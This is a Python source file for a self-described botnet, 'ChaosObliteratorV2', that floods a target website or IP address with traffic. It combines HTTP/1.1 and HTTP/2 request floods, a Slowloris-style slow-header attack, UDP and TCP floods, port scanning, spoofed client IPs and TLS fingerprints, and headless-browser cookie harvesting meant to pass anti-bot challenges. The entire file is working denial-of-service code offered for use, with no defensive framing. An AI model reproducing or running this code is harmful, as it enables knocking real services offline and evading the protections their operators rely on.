import threading
import socket
import http.client
import ssl
import random
import string
import time
import argparse
import logging
import os
import hashlib
import xxhash
import h2.connection
import h2.events
from typing import List
from playwright.sync_api import sync_playwright
import tls_client
import undetected_chromedriver as uc
from http.cookiejar import CookieJar

# Logging Setup
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - [%(levelname)s] %(message)s",
    handlers=[logging.FileHandler("chaos_obliterator_v2.log"), logging.StreamHandler()]
)

class ChaosObliteratorV2:
    def __init__(self, target_l7: str = None, target_l4: str = None, duration: int = 60, threads: int = 30, methods: List[str] = None):
        self.target_l7 = target_l7.replace("https://", "").replace("http://", "").replace("www.", "").split("/")[0] if target_l7 else None
        self.target_l4 = target_l4 if target_l4 else None
        self.duration = duration
        self.threads = min(threads, 60)  # Replit-optimized
        self.methods = methods if methods else ["chaoshttp", "ghostloris", "udpchaos", "tcpobliterator"]
        self.end_time = time.time() + duration
        self.user_agents = [
            f"Mozilla/5.0 (Windows NT {random.uniform(12.0, 18.0):.1f}; Win64; x64) AppleWebKit/537.{random.randint(80, 90)}",
            f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(16, 20)}_0 like Mac OS X) Safari/605.1.{random.randint(40, 50)}"
        ]
        self.success_count = {m: 0 for m in self.methods}
        self.response_times = {m: [] for m in ["chaoshttp", "ghostloris"]}
        self.lock = threading.Lock()
        self.active_ports = [80, 443, 53, 123, 161, 389, 445, 1433, 1900, 5060, 11211, 1812, 5353, 3478, 6881, 17185, 27015, 4433]
        self.jitter_factors = {i: 1.0 for i in range(self.threads)}  # Per-thread jitter
        self.cookies = CookieJar()  # Store cookies from browser
        self.session_headers = {}  # Store headers from browser

    def _random_payload(self, size: int = 512) -> bytes:
        """Upgraded polymorphic payload with larger size."""
        seed = f"{random.randint(10000000000000000, 99999999999999999)}{time.time_ns()}{os.urandom(15).hex()}".encode()
        hash1 = xxhash.xxh3_128(seed).digest()
        hash2 = hashlib.sha3_512(hash1 + os.urandom(13)).digest()
        hash3 = xxhash.xxh64(hash2 + os.urandom(11)).digest()
        hash4 = hashlib.blake2b(hash3 + os.urandom(9), digest_size=32).digest()
        return (hash4 + hash3 + hash2 + os.urandom(1))[:size]

    def _random_path(self) -> str:
        """Dynamic obfuscated URL paths."""
        prefixes = ["v13", "chaos", "obliterator", "nexus", "vortex"]
        segments = [''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(45, 60))) for _ in range(random.randint(12, 15))]
        query = f"?matrix={''.join(random.choices(string.hexdigits.lower(), k=52))}&epoch={random.randint(100000000000000, 999999999999999)}"
        return f"/{random.choice(prefixes)}/{'/'.join(segments)}{query}"

    def _random_ip(self) -> str:
        """Spoofed IP for headers."""
        return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

    def _random_headers(self) -> dict:
        """Upgraded WAF-evading headers with cookie injection."""
        headers = {
            "User-Agent": random.choice(self.user_agents),
            "X-Forwarded-For": self._random_ip(),
            "Accept": random.choice(["application/json", "text/event-stream", "*/*", "application/x-graphql"]),
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Connection": "keep-alive"
        }
        headers.update(self.session_headers)  # Inject headers from browser
        if random.random() < 0.99:
            headers["X-Entropy-Nexus"] = ''.join(random.choices(string.hexdigits.lower(), k=60))
        return headers

    def _get_browser_session(self):
        """Use headless browser to bypass JS challenges and get cookies."""
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            context = browser.new_context(
                user_agent=random.choice(self.user_agents),
                viewport={"width": 1920, "height": 1080}
            )
            page = context.new_page()
            
            # Emulate human behavior
            page.goto(f"https://{self.target_l7}", wait_until="domcontentloaded")
            time.sleep(random.uniform(1, 3))  # Simulate page load
            page.evaluate("window.scrollTo(0, document.body.scrollHeight)")  # Scroll
            time.sleep(random.uniform(0.5, 1.5))  # Random delay
            page.click("body")  # Random click
            time.sleep(random.uniform(0.5, 1.5))
            
            # Get cookies
            cookies = context.cookies()
            for cookie in cookies:
                self.cookies.set_cookie(
                    http.cookiejar.Cookie(
                        version=0, name=cookie["name"], value=cookie["value"],
                        port=None, port_specified=False, domain=self.target_l7,
                        domain_specified=False, domain_initial_dot=False,
                        path=cookie["path"], path_specified=True, secure=cookie["secure"],
                        expires=cookie["expires"], discard=False, comment=None,
                        comment_url=None, rest={}
                    )
                )
            # Get headers from browser
            self.session_headers = {
                "Cookie": "; ".join([f"{c.name}={c.value}" for c in self.cookies]),
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Dest": "document"
            }
            browser.close()

    def _tls_fingerprint_spoof(self) -> ssl.SSLSocket:
        """Spoof TLS fingerprint to mimic Chrome."""
        session = tls_client.Session(
            client_identifier=f"chrome_{random.randint(100, 120)}",
            random_tls_extension_order=True
        )
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.08)
        sock.connect((self.target_l7, 443))
        context = ssl._create_unverified_context()
        return context.wrap_socket(sock, server_hostname=self.target_l7)

    def _scan_ports(self):
        """Dynamic port scanning for L4 targets."""
        if not self.target_l4:
            return
        new_ports = []
        for port in [80, 443, 8080, 3389, 1433, 3306, 1723, 445, 1812, 5353, 3478, 6881, 17185, 27015, 4433]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.05)
                sock.connect((self.target_l4, port))
                new_ports.append(port)
                sock.close()
            except:
                pass
        if new_ports:
            with self.lock:
                self.active_ports = new_ports

    def _adjust_jitter(self, thread_id: int, response_time: float):
        """Per-thread adaptive jitter."""
        with self.lock:
            if response_time > 100:
                self.jitter_factors[thread_id] = min(self.jitter_factors[thread_id] * 1.2, 2.0)
            elif response_time < 50:
                self.jitter_factors[thread_id] = max(self.jitter_factors[thread_id] * 0.8, 0.5)

    def _chaoshttp(self, thread_id: int):
        """Upgraded L7: HTTP flood with browser session and H2 multiplexing."""
        if not self.target_l7:
            return
        while time.time() < self.end_time:
            start_time = time.time()
            try:
                proto = random.random()
                if proto < 0.5:  # HTTP/1.1 with browser cookies
                    conn = http.client.HTTPSConnection(self.target_l7, 443, timeout=0.015, context=ssl._create_unverified_context())
                    headers = self._random_headers()
                    method = random.choice(["GET", "POST", "PUT"])
                    path = self._random_path()
                    body = self._random_payload(512) if method in ["POST", "PUT"] else None
                    conn.request(method, path, body=body, headers=headers)
                    resp = conn.getresponse()
                    self._adjust_jitter(thread_id, (time.time() - start_time) * 1000)
                    with self.lock:
                        self.success_count["chaoshttp"] += 1 if resp.status < 400 else 0
                        self.response_times["chaoshttp"].append((time.time() - start_time) * 1000)
                    conn.close()
                else:  # HTTP/2 with multiplexing
                    sock = self._tls_fingerprint_spoof()
                    h2conn = h2.connection.H2Connection()
                    h2conn.initiate_connection()
                    sock.sendall(h2conn.data_to_send())
                    headers = {":method": "GET", ":authority": self.target_l7, ":scheme": "https", ":path": self._random_path()}
                    headers.update(self._random_headers())
                    # Send multiple streams
                    for stream_id in range(1, 201, 2):  # Up to 100 streams
                        h2conn.send_headers(stream_id, headers, end_stream=True)
                        sock.sendall(h2conn.data_to_send())
                        time.sleep(random.uniform(0.0001, 0.0005) * self.jitter_factors[thread_id])
                    self._adjust_jitter(thread_id, (time.time() - start_time) * 1000)
                    with self.lock:
                        self.success_count["chaoshttp"] += 1
                        self.response_times["chaoshttp"].append((time.time() - start_time) * 1000)
                    sock.close()
                time.sleep(random.uniform(0.0001, 0.0006) * self.jitter_factors[thread_id])
            except:
                pass

    def _ghostloris(self, thread_id: int):
        """Upgraded L7: Ghost Slowloris with TLS spoofing."""
        if not self.target_l7:
            return
        while time.time() < self.end_time:
            start_time = time.time()
            try:
                sock = self._tls_fingerprint_spoof()
                sock.send(f"GET {self._random_path()} HTTP/1.1\r\nHost: {self.target_l7}\r\n".encode())
                time.sleep(random.uniform(0.002, 0.015))
                sock.send(f"User-Agent: {random.choice(self.user_agents)}\r\n".encode())
                time.sleep(random.uniform(0.003, 0.02))
                sock.send(f"X-Forwarded-For: {self._random_ip()}\r\n".encode())
                cookie_str = "; ".join([f"{c.name}={c.value}" for c in self.cookies])
                sock.send(f"Cookie: {cookie_str}\r\nConnection: keep-alive\r\n\r\n".encode())
                self._adjust_jitter(thread_id, (time.time() - start_time) * 1000)
                with self.lock:
                    self.success_count["ghostloris"] += 1
                    self.response_times["ghostloris"].append((time.time() - start_time) * 1000)
                sock.close()
                time.sleep(random.uniform(0.001, 0.006) * self.jitter_factors[thread_id])
            except:
                pass

    def _udpchaos(self, thread_id: int):
        """L4: UDP chaos with larger payloads."""
        if not self.target_l4:
            return
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < self.end_time:
            try:
                port = random.choice(self.active_ports)
                payload = self._random_payload(1024)
                sock.sendto(payload, (self.target_l4, port))
                with self.lock:
                    self.success_count["udpchaos"] += 1
                time.sleep(random.uniform(0.00001, 0.0001) * self.jitter_factors[thread_id])
            except:
                pass
        sock.close()

    def _tcpobliterator(self, thread_id: int):
        """L4: TCP obliterator with larger payloads."""
        if not self.target_l4:
            return
        while time.time() < self.end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.015)
                port = random.choice(self.active_ports)
                sock.connect((self.target_l4, port))
                sock.send(self._random_payload(512))
                with self.lock:
                    self.success_count["tcpobliterator"] += 1
                sock.close()
                time.sleep(random.uniform(0.00001, 0.0001) * self.jitter_factors[thread_id])
            except:
                pass

    def start(self):
        """Unleash the upgraded chaos obliterator."""
        if not self.target_l7 and not self.target_l4:
            logging.error("At least one target (L7 or L4) required")
            return
        logging.info(f"ChaosObliteratorV2 strike on L7: {self.target_l7 or 'None'}, L4: {self.target_l4 or 'None'}, methods: {self.methods}")
        
        # Start browser session for cookies and headers
        if self.target_l7:
            threading.Thread(target=self._get_browser_session, daemon=True).start()
            time.sleep(5)  # Wait for browser session
        
        # Start port scanning for L4
        if self.target_l4:
            threading.Thread(target=self._scan_ports, daemon=True).start()
            time.sleep(0.3)
        
        # Split workers: crawler (browser) and flooder
        threads = []
        method_funcs = {
            "chaoshttp": self._chaoshttp,
            "ghostloris": self._ghostloris,
            "udpchaos": self._udpchaos,
            "tcpobliterator": self._tcpobliterator
        }
        for method in self.methods:
            if method in method_funcs:
                for i in range(self.threads // len(self.methods)):
                    t = threading.Thread(target=method_funcs[method], args=(i,), daemon=True)
                    threads.append(t)
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        avg_response = {k: (sum(v)/len(v) if v else 0) for k, v in self.response_times.items()}
        logging.info(f"Obliteration complete. Success counts: {self.success_count}, Avg response times (ms): {avg_response}")

def main(target_l7: str, target_l4: str, duration: int, methods: str):
    methods = methods.split(",")
    obliterator = ChaosObliteratorV2(target_l7, target_l4, duration, methods=methods)
    obliterator.start()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ChaosObliteratorV2 Botnet")
    parser.add_argument("target_l7", nargs="?", default=None, help="L7 target URL (e.g., http://httpbin.org)")
    parser.add_argument("target_l4", nargs="?", default=None, help="L4 target IP (e.g., 93.184.216.34)")
    parser.add_argument("--duration", type=int, default=60, help="Duration in seconds")
    parser.add_argument("--methods", type=str, default="chaoshttp,ghostloris,udpchaos,tcpobliterator", help="Comma-separated methods")
    args = parser.parse_args()
    main(args.target_l7, args.target_l4, args.duration, args.methods)